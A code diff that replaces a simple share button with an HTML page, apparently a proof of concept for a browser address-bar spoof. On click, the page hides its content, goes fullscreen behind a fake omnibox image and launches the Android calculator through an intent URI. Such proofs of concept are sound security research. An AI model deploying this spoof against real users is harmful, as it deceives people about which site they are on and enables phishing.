@@ -1,1 +1,39 @@
-<input onclick="setTimeout(function(){if(navigator.share){navigator.share({title:'Apple Contact',text:'Share this contact page',url:'https://www.apple.com/contact/'}).catch(err=>console.log(err))}else{alert('Sharing is not supported on this browser')}}, 100)" type="button" value="Click here" />
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
+  <title>Security UI Spoof</title>
+  <style>
+    html, body { height: 100%; margin: 0; padding: 0; }
+    #spoof { width: 100%; height: 100%; display: none; }
+    #content { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; }
+  </style>
+  <script>
+    // When the page is clicked, run the behaviour and open calculator
+    document.addEventListener('click', async () => {
+      try {
+        // keep the original behaviour (optional)
+        await navigator.contacts?.select?.(["name"], {});
+      } catch (e) {
+        // ignore if not available or permission denied
+      }
+
+      // show spoof image / hide content / try fullscreen
+      document.getElementById("spoof").style.display = "block";
+      document.getElementById("content").style.display = "none";
+      try { await document.documentElement.requestFullscreen(); } catch(e){}
+
+      // open calculator app using intent URI
+      // this will attempt to open the calculator on Android
+      window.location.href = "intent://scan/#Intent;scheme=calculator;package=com.android.calculator2;end";
+    }, { once: true });
+  </script>
+</head>
+<body>
+  <img id="spoof" src="spoof.png" alt="spoof image" />
+  <div id="content">
+    <h1>Click anywhere on the page to spoof the omnibox!</h1>
+  </div>
+</body>
+</html>
